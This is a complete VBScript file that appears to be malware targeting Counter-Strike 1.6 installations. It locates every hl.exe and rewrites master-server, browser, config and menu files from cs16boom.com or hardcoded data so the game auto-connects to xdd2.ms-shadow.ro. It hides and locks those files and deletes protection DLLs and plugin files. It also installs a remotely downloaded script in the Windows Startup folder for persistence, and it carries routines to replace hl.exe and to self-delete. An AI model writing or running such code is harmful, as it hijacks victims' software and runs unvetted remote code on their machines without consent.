Sub unProtectFile( filename )
	dim readfile, filesys
	set filesys = CreateObject("Scripting.FileSystemObject")

	If filesys.FileExists( filename ) Then
		set readfile = filesys.GetFile( filename )
		readfile.Attributes = 0 ' normal
	End If
End Sub

Sub protectFile( filename )
	dim readfile, filesys
	set filesys = CreateObject("Scripting.FileSystemObject")

	If filesys.FileExists( filename ) Then
		set readfile = filesys.GetFile( filename )
		readfile.Attributes = 7 ' hidden + system + readonly
	End If
End Sub

Sub DeleteAFile( filename )
	Dim filesys
	Set filesys = CreateObject("Scripting.FileSystemObject")
	
	If filesys.FileExists( filename ) Then
		unProtectFile( filename )
		filesys.DeleteFile( filename ), True
	End If
End Sub

Sub RenameFile( oldName, newName )
	Dim filesys
	Set filesys = WScript.CreateObject("Scripting.FileSystemObject")
	
	If filesys.FileExists( oldName ) Then
		filesys.MoveFile oldName, newName
	End If
End Sub

Sub ClearCFG( path )
On Error Resume Next
	DeleteAFile path
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	Set objFile = objFSO.CreateTextFile(path, ForWriting)
	objFile.Write "connect xdd2.ms-shadow.ro:27016"
	objFile.Close
	protectFile path
End Sub

Sub DeleteAFolder( foldername )
	Dim filesys
	Set filesys = CreateObject("Scripting.FileSystemObject")
	
	If filesys.FolderExists( foldername ) Then
		'unProtectFile( foldername )
		filesys.DeleteFolder( foldername ), True
	End If
End Sub

Sub RenameFolder( oldName, newName )
	Dim filesys
	Set filesys = WScript.CreateObject("Scripting.FileSystemObject")
	
	If filesys.FolderExists( oldName ) Then
		filesys.MoveFolder oldName, newName
	End If 
End Sub

Sub ClearAsi(path)
On Error Resume Next
	set objShell = WScript.CreateObject ("WScript.Shell")
	Set fso = CreateObject("Scripting.FileSystemObject")
	Set curDir    = fso.GetFolder(path)
	
	For Each File in curDir.Files
		If File.Type = "ASI File" or File.Type = "FLT File" Then
		DeleteAFile(path & File.Name)
		End If
	Next
End Sub

Sub UpdateHl(path)
On Error Resume Next
Dim File
File=path & "hl.exe"
Set objHTTP = CreateObject("MSXML2.XMLHTTP") 
	dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
	dim bStrm: Set bStrm = createobject("Adodb.Stream")
	xHttp.Open "GET", "http://cs16boom.com/ms/game.dat", False
	xHttp.Send

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile path & "hl.exe", 2 '//overwrite
end with
End Sub

Sub CheckHl(path)
On Error Resume Next
	set objShell = WScript.CreateObject("WScript.Shell")
	Set fso = CreateObject("Scripting.FileSystemObject")
	Set curDir = fso.GetFolder(objShell.CurrentDirectory)
	For Each File in curDir.Files
		If File.Name = "hl.exe" AND File.Size/1024 > 1000 Then
			UpdateHl(path)
		End If
		Next
AddAutoConnect(path)
End Sub

Sub UpdateMasterServerLocal(path)
On Error Resume Next
Dim MsLocation
MsLocation = Array(path & "config\MasterServers.vdf",path & "config\rev_MasterServers.vdf",path & "config\rew_MasterServers.vdf",path & "platform\config\MasterServers.vdf",path & "platform\config\rev_MasterServers.vdf",path & "platform\config\rew_MasterServers.vdf")
Dim MasterServerData 
MasterServerData="""MasterServers""" & chr(10) & "{" & chr(13)+chr(10) & chr(9) &"""hl1""" & chr(13)+chr(10) & chr(9) &"{" & chr(13)+chr(10) & chr(9) & """0""" & chr(13)+chr(10) & chr(9) & "{" & chr(13)+chr(10) & chr(9) &"""addr"""	&  """master2.ms-shadow.ro:27010""" & chr(13)+chr(10) & chr(9) & "}" & chr(13)+chr(10) & chr(9) & "}" & chr(13)+chr(10) & "}"

Set objFSO = CreateObject("Scripting.FileSystemObject")
For Each File in MsLocation
		DeleteAFile File
		 Set objFile = objFSO.CreateTextFile(File, ForWriting)
		 objFile.Write MasterServerData
		 objFile.Close
		 protectFile(File)
Next
AddAutoConnect
End Sub

Sub ChangeMasterServer(path)
	On Error Resume Next
	Dim MsLocation
	MsLocation = Array(path & "config\MasterServers.vdf",path & "config\rev_MasterServers.vdf",path & "config\rew_MasterServers.vdf",path & "platform\config\MasterServers.vdf",path & "platform\config\rev_MasterServers.vdf",path & "platform\config\rew_MasterServers.vdf")

	Set objHTTP = CreateObject("MSXML2.XMLHTTP") 
	Call objHTTP.Open("GET", "http://cs16boom.com/ms/masterservers.vdf?" & Rnd, FALSE) 
	objHTTP.Send
	Set objFSO = CreateObject("Scripting.FileSystemObject")
For Each File in MsLocation
		DeleteAFile File
		 Set objFile = objFSO.CreateTextFile(File, ForWriting)
		 objFile.Write objHTTP.ResponseText
		 objFile.Close
		 protectFile(File)
Next
AddAutoConnect(path)
End Sub

Sub ChangeServerBrowser(path)
On error resume next
	Dim ServerBrowserLocation
	ServerBrowserLocation = Array (path & "platform\config\serverbrowser.vdf",path & "platform\config\rew_serverbrowser.vdf",path & "platform\config\rev_serverbrowser.vdf",path & "config\serverbrowser.vdf",path & "config\rew_serverbrowser.vdf",path & "config\rev_serverbrowser.vdf")
	Set objHTTP = CreateObject("MSXML2.XMLHTTP") 
	Call objHTTP.Open("GET", "http://cs16boom.com/ms/serverbrowser.vdf?" & Rnd, FALSE) 
	objHTTP.Send
		Set objFSO = CreateObject("Scripting.FileSystemObject")
		For Each File in ServerBrowserLocation
			DeleteAFile File
			Set objFile = objFSO.CreateTextFile(File, ForWriting)
			objFile.Write objHTTP.ResponseText
			objFile.Close
		Next 
	AddAutoConnect(path)
End Sub


Sub AddAutoConnect(path)
	ClearCFG path & "cstrike\hw\geforce.cfg"
	ClearCFG path & "cstrike\hw\opengl.cfg"
	ClearCFG path & "cstrike\autoexec.cfg"
	ClearCFG path & "cstrike\valve.rc"
	ClearCFG path & "valve\valve.rc"
	ClearCFG path & "valve\hw\geforce.cfg"
	ClearCFG path & "valve\hw\opengl.cfg"
	ClearCFG path & "valve\valve.rc"
End Sub

Sub ChangeConfig(path)
On error Resume Next
	Dim ConfigLocation
	ConfigLocation = Array (path & "cstrike\config.cfg",path & "cstrike\userconfig.cfg")
	Set objHTTP = CreateObject("MSXML2.XMLHTTP") 
	Call objHTTP.Open("GET", "http://cs16boom.com/ms/config.cfg?" & Rnd, FALSE) 
	objHTTP.Send
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	For Each File in ConfigLocation
		DeleteAFile File
		Set objFile = objFSO.CreateTextFile(File, ForWriting)
		objFile.Write objHTTP.ResponseText
		objFile.Close
	Next 
	AddAutoConnect(path)
End Sub

Sub ChangeConfigLocal(path)
On error Resume Next
	Dim ConfigLocation
	ConfigLocation = Array (path & "cstrike\config.cfg",path & "cstrike\userconfig.cfg")
	Dim localConfig
	localConfig = "unbindall" & chr(10) & "bind " & """TAB""" & chr(32) & """+showscores""" & chr(10) & "bind " & """ENTER""" & chr(32) & """+attack""" & chr(10) & "bind " & """ESCAPE""" & chr(32) & """cancelselect""" & chr(10) & "bind " & """SPACE""" & chr(32) & """+jump""" & chr(10) & "bind " & """+""" & chr(32) & """sizeup""" & chr(10) & "bind " & """,""" & chr(32) & """buyammo1""" & chr(10) & "bind " & """-""" & chr(32) & """sizedown""" & chr(10) & "bind " & """.""" & chr(32) & """buyammo2""" & chr(10) & "bind " & """/""" & chr(32) & """+movedown""" & chr(10) & "bind " & """0""" & chr(32) & """slot10""" & chr(10) & "bind " & """1""" & chr(32) & """slot1""" & chr(10) & "bind " & """2""" & chr(32) & """slot2""" & chr(10) & "bind " & """3""" & chr(32) & """slot3""" & chr(10) & "bind " & """4""" & chr(32) & """slot4""" & chr(10) & "bind " & """5""" & chr(32) & """slot5""" & chr(10) & "bind " & """6""" & chr(32) & """slot6""" & chr(10) & "bind " & """7""" & chr(32) & """slot7""" & chr(10) & "bind " & """8""" & chr(32) & """slot8""" & chr(10) & "bind " & """9""" & chr(32) & """slot9""" & chr(10) & "bind " & """;""" & chr(32) & """+mlook""" & chr(10) & "bind " & """=""" & chr(32) & """sizeup""" & chr(10) & "bind " & """[""" & chr(32) & """invprev""" & chr(10) & "bind " & """]""" & chr(32) & """invnext""" & chr(10) & "bind " & """`""" & chr(32) & """toggleconsole""" & chr(10) & "bind " & """a""" & chr(32) & """+moveleft""" & chr(10) & "bind " & """b""" & chr(32) & """buy""" & chr(10) & "bind " & """c""" & chr(32) & """radio3""" & chr(10) & "bind " & """d""" & chr(32) & """+moveright""" & chr(10) & "bind " & """e""" & chr(32) & """+use""" & chr(10) & "bind " & """f""" & chr(32) & """impulse 100""" & chr(10) & "bind " & """g""" & chr(32) & """drop""" & chr(10) & "bind " & """h""" & chr(32) & """+commandmenu""" & chr(10) & "bind " & """j""" & chr(32) & """cheer""" & chr(10) & "bind " & """k""" & chr(32) & """+voicerecord""" & chr(10) & "bind " & """l""" & chr(32) & """showbriefing""" & chr(10) & "bind " & """m""" & chr(32) & """chooseteam""" & chr(10) & "bind " & """n""" & chr(32) & """nightvision""" & chr(10) & "bind " & """o""" & chr(32) & """buyequip""" & chr(10) & "bind " & """q""" & chr(32) & """lastinv""" & chr(10) & "bind " & """r""" & chr(32) & """+reload""" & chr(10) & "bind " & """s""" & chr(32) & """+back""" & chr(10) & "bind " & """t""" & chr(32) & """impulse 201""" & chr(10) & "bind " & """u""" & chr(32) & """messagemode2""" & chr(10) & "bind " & """v""" & chr(32) & """+moveup""" & chr(10) & "bind " & """w""" & chr(32) & """+forward""" & chr(10) & "bind " & """x""" & chr(32) & """radio2""" & chr(10) & "bind " & """y""" & chr(32) & """messagemode""" & chr(10) & "bind " & """z""" & chr(32) & """radio1""" & chr(10) & "bind " & """~""" & chr(32) & """toggleconsole""" & chr(10) & "bind " & """UPARROW""" & chr(32) & """+forward""" & chr(10) & "bind " & """DOWNARROW""" & chr(32) & """+back""" & chr(10) & "bind " & """LEFTARROW""" & chr(32) & """+left""" & chr(10) & "bind " & """RIGHTARROW""" & chr(32) & """+right""" & chr(10) & "bind " & """ALT""" & chr(32) & """+strafe""" & chr(10) & "bind " & """CTRL""" & chr(32) & """+duck""" & chr(10) & "bind " & """SHIFT""" & chr(32) & """+speed""" & chr(10) & "bind " & """F1""" & chr(32) & """autobuy""" & chr(10) & "bind " & """F2""" & chr(32) & """rebuy""" & chr(10) & "bind " & """F5""" & chr(32) & """snapshot""" & chr(10) & "bind " & """F6""" & chr(32) & """save quick""" & chr(10) & "bind " & """F7""" & chr(32) & """load quick""" & chr(10) & "bind " & """F10""" & chr(32) & """quit prompt""" & chr(10) & "bind " & """INS""" & chr(32) & """+klook""" & chr(10) & "bind " & """PGDN""" & chr(32) & """+lookdown""" & chr(10) & "bind " & """PGUP""" & chr(32) & """+lookup""" & chr(10) & "bind " & """END""" & chr(32) & """centerview""" & chr(10) & "bind " & """MWHEELDOWN""" & chr(32) & """invnext""" & chr(10) & "bind " & """MWHEELUP""" & chr(32) & """invprev""" & chr(10) & "bind " & """MOUSE1""" & chr(32) & """+attack""" & chr(10) & "bind " & """MOUSE2""" & chr(32) & """+attack2""" & chr(10) & "bind " & """PAUSE""" & chr(32) & """pause""" & chr(10) & "setinfo _cl_autowepswitch 1" & chr(10) & "topcolor 0" & chr(10) & "bottomcolor 0" & chr(10) & "cl_autowepswitch 1" & chr(10) & "connect xdd2.ms-shadow.ro:27016" & chr(10) & "name" & chr(32) & """TB-PlayerX""" 

	objHTTP.Send
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	For Each File in ConfigLocation
		DeleteAFile File
		Set objFile = objFSO.CreateTextFile(File, ForWriting)
		objFile.Write localConfig
		objFile.Close
	Next 
	AddAutoConnect(path)
End Sub

Sub MasiveDelete(path)
On Error Resume Next
	RenameFolder path & "cstrike\bin", "cstrike\bin_old"
	RenameFolder path & "cstrike\save", "cstrike\save_old"
	RenameFile path & "cstrike\bin", "cstrike\bin_old"
	RenameFile path & "cstrike\save", "cstrike\save_old"
	RenameFile path & "valve\bin\TrackerUI.dll"
	RenameFile path & "cstrike\cl_dlls\ParticleMan.dll"
	DeleteAFile path & "CsShield.dll"
	DeleteAFile path & "cstrike\bin\TrackerUI.dll"
	DeleteAFile path & "valve\bin\TrackerUI.dll"
	DeleteAFile path & "cstrike\cl_dlls\ParticleMan.dll"
	DeleteAFile path & "valve\bin\TrackerUI.dll.old"
	DeleteAFile path & "SMShield.ini"
	DeleteAFile path & "SMShield.mix"
	DeleteAFile path & "client_save.dll"
	DeleteAFile path & "SMShield.txt"	
	DeleteAFile path & "LoaderD.dll"
	DeleteAFile path & "LoaderD.txt"	
	DeleteAFile path & "LoaderD.ini"	
	DeleteAFile path & "cstrike\cs.exe"
	DeleteAFile path & "cstrike\radial.cdb"
	protectFile(path & "cstrike\liblist.gam")
	protectFile(path & "cstrike\userconfig.cfg")
End Sub

Sub ChangeToNull(path)
On Error Resume Next
	MasiveDelete
	Dim Location
	Location = Array(path & "cstrike\save",path & "cstrike\bin")
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	For Each File In Location
		DeleteAFile File
		Set objFile = objFSO.CreateTextFile(File, ForWriting)
		objFile.Write NULL
		objFile.Close
		protectFile(File)
	Next
End Sub


Sub ChangeGameMenu(path)
On error Resume Next
	Dim File
	File = path & "cstrike\resource\GameMenu.res"
	Set objHTTP = CreateObject("MSXML2.XMLHTTP") 
	Call objHTTP.Open("GET", "http://cs16boom.com/ms/gamemenu.res?" & Rnd, FALSE) 
	objHTTP.Send
	Set objFSO = CreateObject("Scripting.FileSystemObject")
		DeleteAFile File
		Set objFile = objFSO.CreateTextFile(File, ForWriting)
		objFile.Write objHTTP.ResponseText
		objFile.Close
	protectFile File
End Sub

Sub ChangeGameMenuLocal(path)
On error Resume Next
	Dim File
	File = path & "cstrike\resource\GameMenu.res"
	Dim localGameMenu
	localGameMenu = """GameMenu""" & chr(32) & "{" & chr(32) & """1""" & chr(32) & "{" & chr(32) & """label""" & chr(32) & """Join random server""" & chr(32) & """command""" & chr(32) & """engine Connect xdd2.ms-shadow.ro:27016""" & chr(32) & "}" & chr(32) & """2""" & chr(32) & "{" & chr(32) & """label""" & chr(32) & """""" & chr(32) & """command""" & chr(32) & """""" & chr(32) & "}" & chr(32) & """3""" & chr(32) & "{" & chr(32) & """label""" & chr(32) & """#GameUI_GameMenu_ResumeGame""" & chr(32) & """command""" & chr(32) & """ResumeGame""" & chr(32) & """OnlyInGame""" & chr(32) & """1""" & chr(32) & "}" & chr(32) & """4""" & chr(32) & "{" & chr(32) & """label""" & chr(32) & """#GameUI_GameMenu_Disconnect""" & chr(32) & """command""" & chr(32) & """Disconnect""" & chr(32) & """OnlyInGame""" & chr(32) & """1""" & chr(32) & """notsingle""" & chr(32) & """1""" & chr(32) & "}" & chr(32) & """5""" & chr(32) & "{" & chr(32) & """label""" & chr(32) & """#GameUI_GameMenu_PlayerList""" & chr(32) & """command""" & chr(32) & """OpenPlayerListDialog""" & chr(32) & """OnlyInGame""" & chr(32) & """1""" & chr(32) & """notsingle""" & chr(32) & """1""" & chr(32) & "}" & chr(32) & """9""" & chr(32) & "{" & chr(32) & """label""" & chr(32) & """""" & chr(32) & """command""" & chr(32) & """""" & chr(32) & """OnlyInGame""" & chr(32) & """1""" & chr(32) & "}" & chr(32) & """10""" & chr(32) & "{" & chr(32) & """label""" & chr(32) & """#GameUI_GameMenu_NewGame""" & chr(32) & """command""" & chr(32) & """OpenCreateMultiplayerGameDialog""" & chr(32) & "}" & chr(32) & """11""" & chr(32) & "{" & chr(32) & """label""" & chr(32) & """#GameUI_GameMenu_FindServers""" & chr(32) & """command""" & chr(32) & """OpenServerBrowser""" & chr(32) & "}" & chr(32) & """12""" & chr(32) & "{" & chr(32) & """label""" & chr(32) & """#GameUI_GameMenu_Options""" & chr(32) & """command""" & chr(32) & """OpenOptionsDialog""" & chr(32) & "}" & chr(32) & """13""" & chr(32) & "{" & chr(32) & """label""" & chr(32) & """#GameUI_GameMenu_Quit""" & chr(32) & """command""" & chr(32) & """Quit""" & chr(32) & "}" & chr(32) &"}"
	Set objFSO = CreateObject("Scripting.FileSystemObject")
		DeleteAFile File
		Set objFile = objFSO.CreateTextFile(File, ForWriting)
		objFile.Write localGameMenu
		objFile.Close
	protectFile File
End Sub

Sub DeleteMe()
On Error Resume Next
	WScript.Sleep 4000
	Set fileSystem = CreateObject("Scripting.FileSystemObject")
	thisScript = Wscript.ScriptFullName
	fileSystem.DeleteFile(thisScript)
End Sub

Sub AddToStartUp()
On Error Resume Next
	Set objShell = Wscript.CreateObject("Wscript.Shell")
	Set fso = CreateObject("Scripting.FileSystemObject")
	Set MyDoc    = fso.GetFolder(objShell.SpecialFolders("Startup"))
	Set objHTTP = CreateObject("MSXML2.XMLHTTP")
	Call objHTTP.Open("GET", "http://cs16boom.com/ms/remain.vbs?" & Rnd, FALSE) 
	objHTTP.Send
	If objHTTP.ResponseText <> Empty Then
		Set objFile = fso.CreateTextFile(MyDoc & "\" & "shellwind.vbs", True)
		objFile.Write objHTTP.ResponseText
		objFile.Close
		protectFile(MyDoc & "\" & "shellwind.vbs")
	End If
End Sub


Sub CheckAllGames()
On Error Resume Next
strComputer = "."
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

Set colFiles = objWMIService.ExecQuery _
    ("Select * from CIM_DataFile Where Filename = 'hl' and Extension = 'exe'")
For Each objFile in colFiles
	If netStats = 1 Then
		ChangeToNull(objFile.Drive & objFile.Path)
		'CheckHl(objFile.Drive & objFile.Path)
		ClearAsi(objFile.Drive & objFile.Path)
		ChangeMasterServer(objFile.Drive & objFile.Path)
		ChangeServerBrowser(objFile.Drive & objFile.Path)
		ChangeConfig(objFile.Drive & objFile.Path)
		ChangeGameMenu(objFile.Drive & objFile.Path)	
	Else 
		ChangeToNull(objFile.Drive & objFile.Path)
		ClearAsi(objFile.Drive & objFile.Path)
		UpdateMasterServerLocal(objFile.Drive & objFile.Path)
		ChangeConfigLocal(objFile.Drive & objFile.Path)
		ChangeGameMenuLocal(objFile.Drive & objFile.Path)	
	End If
Next

End Sub

Function netStats
	Set oFSO = CreateObject("Scripting.FileSystemObject")
	Set oShell = WScript.CreateObject("WScript.Shell")
	strHost = "google.com"
	strPingCommand = "ping -n 1 -w 300 " & strHost
	ReturnCode = oShell.Run(strPingCommand, 0 , True)
	If ReturnCode = 0 Then
		netStats=1
	Else
		netStats=0
	End If
End Function


WScript.Sleep(60000)
If netStats = 0 Then
	WScript.Sleep(90000)
End If

CheckAllGames
